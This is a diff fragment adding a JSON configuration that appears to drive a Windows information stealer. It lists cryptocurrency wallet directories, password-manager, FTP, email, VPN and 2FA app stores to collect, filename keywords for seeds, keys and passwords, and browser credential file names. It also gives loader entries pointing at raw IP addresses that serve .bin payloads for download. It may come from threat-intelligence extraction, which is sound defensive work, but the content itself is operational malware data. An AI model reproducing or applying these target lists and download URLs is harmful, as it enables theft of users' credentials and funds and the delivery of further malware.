+            "p": "\\Roaming\\devcoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\26",
+            "p": "\\Roaming\\digitalcoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\27",
+            "p": "\\Roaming\\Florincoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\28",
+            "p": "\\Roaming\\Franko",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\29",
+            "p": "\\Roaming\\Freicoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\30",
+            "p": "\\Roaming\\GoldCoin (GLD)",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\31",
+            "p": "\\Roaming\\GInfinitecoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\32",
+            "p": "\\Roaming\\IOCoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\33",
+            "p": "\\Roaming\\Ixcoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\10",
+            "p": "\\Roaming\\Litecoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\34",
+            "p": "\\Roaming\\Megacoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\35",
+            "p": "\\Roaming\\Mincoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\36",
+            "p": "\\Roaming\\Namecoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\37",
+            "p": "\\Roaming\\Primecoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\38",
+            "p": "\\Roaming\\Terracoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\39",
+            "p": "\\Roaming\\YACoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*wal*.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\8",
+            "p": "\\Roaming\\Dogecoin",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "wallet.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\12",
+            "p": "\\Roaming\\ElectronCash\\wallets",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "*.*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\13",
+            "p": "\\Roaming\\MultiDoge",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "multidoge.wallet"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\14",
+            "p": "\\Roaming\\com.liberty.jaxx\\IndexedDB\\file__0.indexeddb.leveldb",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*.*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\15",
+            "p": "\\Roaming\\atomic\\Local Storage\\leveldb",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*.*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\17",
+            "p": "\\Roaming\\Daedalus Mainnet\\wallets",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "she*.sqlite"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\18",
+            "p": "\\Roaming\\Coinomi\\Coinomi\\wallets",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*.wallet",
+                "*.config"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\20",
+            "p": "\\Roaming\\Ledger Live",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\41",
+            "p": "\\Roaming\\Ledger Wallet",
+            "t": 2,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "w",
+            "n": "w\\42",
+            "p": "\\Roaming\\@trezor\\suite-desktop",
+            "t": 2,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        }
+    ],
+    "sO": [
+        {
+            "a": "o",
+            "n": "o\\19",
+            "p": "C:\\Program Files (x86)\\GoFTP\\settings",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "Connections.txt"
+            ],
+            "tp": 1
+        },
+        {
+            "a": "o",
+            "n": "o\\20",
+            "p": "C:\\Users\\cuck\\Documents\\yMail2",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "Accounts.xml",
+                "POP3.xml",
+                "SMTP.xml"
+            ],
+            "tp": 1
+        },
+        {
+            "a": "o",
+            "n": "o\\21",
+            "p": "\\Roaming\\FTPInfo",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "ServerList.xml",
+                "ServerList.cfg"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\22",
+            "p": "\\Roaming\\UltraFXP",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "sites.xml"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\23",
+            "p": "\\Roaming\\NetDrive",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "NDSites.ini"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\24",
+            "p": "\\Roaming\\FTP Now",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "sites.xml"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\25",
+            "p": "C:\\Program Files (x86)\\DeluxeFTP",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "sites.xml"
+            ],
+            "tp": 1
+        },
+        {
+            "a": "o",
+            "n": "o\\26",
+            "p": "\\Roaming\\Opera Mail\\Opera Mail",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "wand.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\27",
+            "p": "\\Roaming\\FTPGetter",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "servers.xml"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\28",
+            "p": "\\Roaming\\Steed",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "bookmarks.txt"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\29",
+            "p": "\\Roaming\\Microsoft\\Sticky Notes",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "StickyNotes.snt"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\30",
+            "p": "\\Roaming\\Conceptworld\\Notezilla",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "Notes8.db"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\31",
+            "p": "\\Roaming\\To-Do DeskList",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "tasks.db"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\32",
+            "p": "\\Roaming\\Estsoft\\ALFTP",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "ESTdb2.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\33",
+            "p": "\\Roaming\\BitKinex",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "bitkinex.ds"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\34",
+            "p": "\\Roaming\\TrulyMail\\Data\\Settings",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "user.config"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\35",
+            "p": "\\Roaming\\Pocomail",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "accounts.ini"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\36",
+            "p": "\\Roaming\\Notepad\u002B\u002B\\plugins\\config\\NppFTP",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "NppFTP.xml"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\37",
+            "p": "\\Roaming\\FTPBox",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "profiles.conf"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\38",
+            "p": "\\Local\\INSoftware\\NovaFTP",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "NovaFTP.db"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\39",
+            "p": "\\Roaming\\GmailNotifierPro",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "ConfigData.xml"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\40",
+            "p": "\\Roaming\\BlazeFtp",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "site.dat"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\7",
+            "p": "\\Roaming\\Bitwarden",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "data*.json"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\16",
+            "p": "\\Roaming\\NordPass",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*.conf"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\17",
+            "p": "\\Local\\1Password\\data",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*.sqlite"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\18",
+            "p": "\\Local\\RoboForm\\Profiles",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*.rfo"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\2",
+            "p": "\\Roaming\\MySQL\\Workbench",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "connections.xml"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\4",
+            "p": "\\Roaming\\GHISLER",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "wcx_ftp.ini"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\15",
+            "p": "\\Local\\Mailbird\\Store",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "Store.db"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\8",
+            "p": "\\Roaming\\Authy Desktop\\Local Storage\\leveldb",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\1",
+            "p": "\\Roaming\\AnyDesk",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "*.conf"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\3",
+            "p": "\\Roaming\\FileZilla",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "recentservers.xml",
+                "sitemanager.xml"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\11",
+            "p": "\\Local\\Mailbird\\Store",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "*.db"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\12",
+            "p": "\\Roaming\\eM Client",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "*.dat",
+                "*.dat-shm",
+                "*.dat-wal",
+                "*.eml"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\9",
+            "p": "\\Roaming\\The Bat!",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*.TBB",
+                "*.TBN",
+                "*.MSG",
+                "*.EML",
+                "*.MSB",
+                "*.mbox",
+                "*.ABD",
+                "*.FLX",
+                "*.TBK",
+                "*.HBI",
+                "*.txt"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\10",
+            "p": "C:\\PMAIL",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*.CNM",
+                "*.PMF",
+                "*.PMN",
+                "*.PML",
+                "*CACHE.PM",
+                "*.WPM",
+                "*.PM",
+                "*.USR"
+            ],
+            "tp": 1
+        },
+        {
+            "a": "o",
+            "n": "o\\13",
+            "p": "C:\\Users\\\u003Cuser\u003E\\snowflake-ssh",
+            "t": 1,
+            "r": false,
+            "gl": 2,
+            "f": [
+                "session-store.json"
+            ],
+            "tp": 1
+        },
+        {
+            "a": "o",
+            "n": "o\\6",
+            "p": "\\Local\\NordVPN",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "user.config"
+            ],
+            "tp": 2
+        },
+        {
+            "a": "o",
+            "n": "o\\14",
+            "p": "\\Local\\AzireVPN",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "token.txt"
+            ],
+            "tp": 2
+        }
+    ],
+    "g": [
+        {
+            "a": "g",
+            "n": "g",
+            "p": "",
+            "t": 1,
+            "r": true,
+            "gl": 4,
+            "f": [
+                "*.txt",
+                "*upbit*",
+                "*bcex*",
+                "*bithimb*",
+                "*hitbtc*",
+                "*bitflyer*",
+                "*kucoin*",
+                "*huobi*",
+                "*poloniex*",
+                "*kraken*",
+                "*okex*",
+                "*binance*",
+                "*bitfinex*",
+                "*gdax*",
+                "*ethereum*",
+                "*exodus*",
+                "*metamask*",
+                "*myetherwallet*",
+                "*electrum*",
+                "*bitcoin*",
+                "*blockchain*",
+                "*coinomi*",
+                "*words*",
+                "*meta*",
+                "*mask*",
+                "*eth*",
+                "*recovery*",
+                "*wallet*",
+                "*seed*",
+                "*btc*",
+                "*key*",
+                "*crypto*",
+                "*coin*",
+                "*private*",
+                "*2fa*",
+                "*auth*",
+                "*ledger*",
+                "*trezor*",
+                "*pass*",
+                "*wal*"
+            ],
+            "tp": 3
+        },
+        {
+            "a": "g",
+            "n": "g",
+            "p": "\\Documents",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*.doc",
+                "*.docx",
+                "*.txt",
+                "*.pdf",
+                "*.rtf",
+                "*upbit*",
+                "*bcex*",
+                "*bithimb*",
+                "*hitbtc*",
+                "*bitflyer*",
+                "*kucoin*",
+                "*huobi*",
+                "*poloniex*",
+                "*kraken*",
+                "*okex*",
+                "*binance*",
+                "*bitfinex*",
+                "*gdax*",
+                "*ethereum*",
+                "*exodus*",
+                "*metamask*",
+                "*myetherwallet*",
+                "*electrum*",
+                "*bitcoin*",
+                "*blockchain*",
+                "*coinomi*",
+                "*words*",
+                "*meta*",
+                "*mask*",
+                "*eth*",
+                "*recovery*",
+                "*wallet*",
+                "*seed*",
+                "*btc*",
+                "*key*",
+                "*crypto*",
+                "*coin*",
+                "*private*",
+                "*2fa*",
+                "*auth*",
+                "*ledger*",
+                "*trezor*",
+                "*pass*",
+                "*wal*"
+            ],
+            "tp": 4
+        },
+        {
+            "a": "g",
+            "n": "g",
+            "p": "\\AppData\\Roaming\\Microsoft\\Windows\\Recent",
+            "t": 1,
+            "r": true,
+            "gl": 2,
+            "f": [
+                "*.doc",
+                "*.docx",
+                "*.txt",
+                "*.pdf",
+                "*.rtf",
+                "*upbit*",
+                "*bcex*",
+                "*bithimb*",
+                "*hitbtc*",
+                "*bitflyer*",
+                "*kucoin*",
+                "*huobi*",
+                "*poloniex*",
+                "*kraken*",
+                "*okex*",
+                "*binance*",
+                "*bitfinex*",
+                "*gdax*",
+                "*ethereum*",
+                "*exodus*",
+                "*metamask*",
+                "*myetherwallet*",
+                "*electrum*",
+                "*bitcoin*",
+                "*blockchain*",
+                "*coinomi*",
+                "*words*",
+                "*meta*",
+                "*mask*",
+                "*eth*",
+                "*recovery*",
+                "*wallet*",
+                "*seed*",
+                "*btc*",
+                "*key*",
+                "*crypto*",
+                "*coin*",
+                "*private*",
+                "*2fa*",
+                "*auth*",
+                "*ledger*",
+                "*trezor*",
+                "*pass*",
+                "*wal*"
+            ],
+            "tp": 4
+        }
+    ],
+    "ld": [
+        {
+            "u": "http://87.120.219.26/P9m4H7S2FqDTof",
+            "tf": 4,
+            "tr": 2,
+            "c": [
+                "US"
+            ],
+            "p": 4,
+            "w": false
+        },
+        {
+            "u": "http://87.120.219.26/CCZT7wMNnD29ie",
+            "tf": 4,
+            "tr": 2,
+            "c": [],
+            "p": 99,
+            "w": false
+        },
+        {
+            "u": "http://185.236.20.33/Q2H8MQavNQEoKBiygJ/blender.bin",
+            "tf": 5,
+            "tr": 2,
+            "c": [],
+            "p": 1,
+            "w": false
+        },
+        {
+            "u": "http://185.236.20.33/Q2H8MQavNQEoKBiygJ/discord.bin",
+            "tf": 5,
+            "tr": 2,
+            "c": [],
+            "p": 2,
+            "w": false
+        }
+    ],
+    "str": {
+        "brCH": {
+            "ls": "Local State",
+            "ld": "Login Data",
+            "wd": "Web Data",
+            "Co": "Cookies",
+            "NCo": "Network\\Cookies",
+            "pf": "Preferences",
+            "os_c": "os_crypt",
+            "en_k": "encrypted_key",
+            "ex": "Local Extension Settings",
+            "sy": "Sync Extension Settings",
+            "in": "IndexedDB\\chrome-extension_",
+            "inc": "IndexedDB",
+            "chs": "chrome-extension_",
+            "ib": "_0.indexeddb.leveldb"
+        },
+        "brGk": {
+            "pf": "prefs.js",
+            "k4": "key4.db",
+            "k3": "key3.db",
+            "fh": "formhistory.sqlite",
+            "co": "cookies.sqlite",
+            "cr": "cert9.db",
+            "lg": "logins.json"
+        },
+        "fnc": {
+            "a": "15792294681694759911",
+            "b": "11383415386184703063",
+            "c": "3409464366678354688",
+            "d": "2671781009742191949",
+            "e": "18081020163143810973",
+            "f": "8045878863314484420",
+            "g": "18320271284529437389",
+            "h": "8238430057369102005",
+            "i": "17905928733945146098",
+            "j": "789593363246702628",
+            "k": "8746945999661303053",
+            "l": "7834899509312512038",
+            "m": "15510247472470572686",
+            "n": "8056023207141983416",
+            "o": "2920624034358931110",
+            "p": "9958424722832223327",
+            "r": "3933506600908304605",
+            "s": "10716392707990730713",
+            "t": "9351356959942806932",
+            "u": "7946481864194637112",
+            "v": "7961335952695543013",
+            "w": "12002489682619589618",
+            "x": "5421644170316994026",
+            "y": "13697246453241158521",
+            "z": "2226158375018974002",
+            "aa": "5362603229995390255",
+            "ab": "3714436012677341542",
+            "ac": "4165922393",
+            "ad": "1090911318",
+            "Ax": "Wininet.dll",
+            "Bx": "Kernel32.dll",
+            "Cx": "Crypt32.dll",
+            "Dx": "DXGI.dll",
+            "Ex": "NTDLL.dll",
+            "Fx": "User32.dll"
+        },
+        "wv": {
+            "1": "Windows 11",
+            "2": "Windows 10",
+            "3": "Windows 8.1",
+            "4": "Windows 8",
+            "5": "Windows 7",
+            "6": "Windows Server 2012 R2",
+            "7": "Windows Server 2012",
+            "8": "Windows Server 2008 R2",
+            "9": "Windows Vista",
+            "10": "Windows Server 2008",
+            "11": "Windows Server 2003",
+            "12": "Unknown Windows version"
+        },
+        "ostr": {
+            "ad": "AppData"
+        }
+    }
+}
